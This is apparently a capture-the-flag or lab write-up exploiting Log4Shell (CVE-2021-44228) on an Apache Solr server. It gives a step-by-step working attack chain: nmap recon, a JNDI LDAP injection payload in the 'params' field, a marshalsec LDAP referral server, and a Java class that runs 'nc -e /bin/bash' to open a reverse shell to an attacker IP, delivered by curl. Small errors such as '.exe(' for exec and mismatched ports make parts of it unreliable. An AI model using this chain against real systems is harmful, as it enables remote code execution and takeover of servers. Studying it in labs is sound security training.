# log4j

## Reconnaissance
First thing is to scan and enumerate the target using nmap. CVE-2021-44228, dubbed "Log4Shell", impacts the Java logging package log4j versions 2.0-beta9 through 2.12.1 and 2.13.0 through 2.15.0<br>
```bash
nmap -p- -sC -sV -oN log4j.nmap 10.10.98.169
```
nmap results are found in <a href="log4j.nmap">log4j.nmap</a><br>

## Discovery
This server is running Java 1.8.0_181 and <a href="https://solr.apache.org/">Apache Solr</a>.<br>
A sample of the log files are provided in this room. An important log file of note is <a href="solrlogs/solr.log">solr.log</a>. A sample of what is important is below:
```
2021-12-13 03:44:58.415 INFO  (qtp1083962448-20) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=80
2021-12-13 03:47:53.989 INFO  (qtp1083962448-21) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
2021-12-13 03:47:54.819 INFO  (qtp1083962448-16) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
2021-12-13 03:47:55.284 INFO  (qtp1083962448-19) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
2021-12-13 03:47:55.682 INFO  (qtp1083962448-22) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
2021-12-13 03:47:56.075 INFO  (qtp1083962448-20) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
2021-12-13 03:47:56.459 INFO  (qtp1083962448-23) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
2021-12-13 03:47:56.844 INFO  (qtp1083962448-14) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
2021-12-13 03:47:57.253 INFO  (qtp1083962448-17) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
2021-12-13 03:47:57.548 INFO  (qtp1083962448-18) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
```
Params seems like a potential attack vector.

## Proof of Concept
Navigating to http://10.10.98.169/solr/admin/cores/ gives us a JSON object.<br>
```
The log4j package adds extra logic to logs by "parsing" entries, ultimately to enrich the data -- but may additionally take actions and even evaluate code based off the entry data. This is the gist of CVE-2021-44228. Other syntax might be in fact executed just as it is entered into log files.
```
Some examples of this syntax are :
<ul>
<li>${sys:os.name}</li>
<li>${sys:user.name}</li>
<li>${log4j:configureParentLocation}</li>
<li>${ENV:PATH}</li>
<li>${ENV:HOSTNAME}</li>
<li>${java:version}</li>
</ul>
The general payload to exploit the log4j vulnerability is as follows:

```
${jndi:ldap://ATTACKER_CONTROLLED_HOST}
```
Java Naming and Directory Interface (JNDI) which is used to access external resources, or "references", which is weaponized in this attack.<br>
Where could we enter this syntax?<br>
<b>Anywhere that has data logged by the application<b><br>
We know that params is the attack vector but other locations might be:
<ul>
<li>Input boxes, user and password for login forms, data entry points</li>
<li>HTTP headers such as User-Agent, X-Forwarded-For, or other customizable headers</li>
<li><b>Any place for user-supplied data</b></li>
</ul>
<a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf">Here</a> is a Black-Hat talk about the JNDI attack surface.<br>

Set up a reverse-shell

```bash
nc -lnvp 9999
```

Make a request including the JNDI payload syntax as part of the HTTP parameters. 
```bash
curl 'http://10.10.67.235:8983/solr/admin/cores?params=$\{jndi:ldap://10.6.67.75:9999\}'
```

## Exploitaion
Right now, when a shell is caught, all it displays is non-printable characters because of the LDAP. We can use a <b>LDAP Referral Server</b> which redirects the initial request of the victim to another location where you can stage a secondary payload. The attack chain is as follows:
1. ${jndi:ldap://ATTACK_CONTROLLED_HOST:PORT/Resource} -> reaches out to our LDAP Referral server
2. LDAP Referral server springboards the request to a secondary http://ATTACK_SERVER/Resource
3. The victim receives and executes the code resent at http://ATTACK_SERVER/resource 

I can set up an HTTP server that will be refered by LDAP.
```bash
python3 -m http.server 8080
```
After downloading and building <a href="https://github.com/mbechler/marshalsec">this</a> LDAP server. 
```bash
mvn clean package -DskipTests
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.ATTACKER.IP.ADDRESS:8000/#Exploit"
```
This sets creates and start a listener on port 1389.<br>
Lastly, I need to create code that will be executed. This is written in Java.
```java
public class Exploit {
	static {
		try {
			java.lang.Runtime.getRuntime().exe("nc -e /bin/bash 10.6.67.75 9999");
		} catch (Exception e) {
			e.printStackTrace();
		}

	}
}
```
Compile
```bash
javac Exploit.java -source 8 -target 8
```
And start a listener to catch the shell
```bash
nc -lnvp 9999
```
Lastly is to deliver the payload
```bash
curl 'http://10.10.67.235:8983/solr/admin/cores?params=$\{jndi:ldap://10.6.67.75:1389/Exploit\}'
```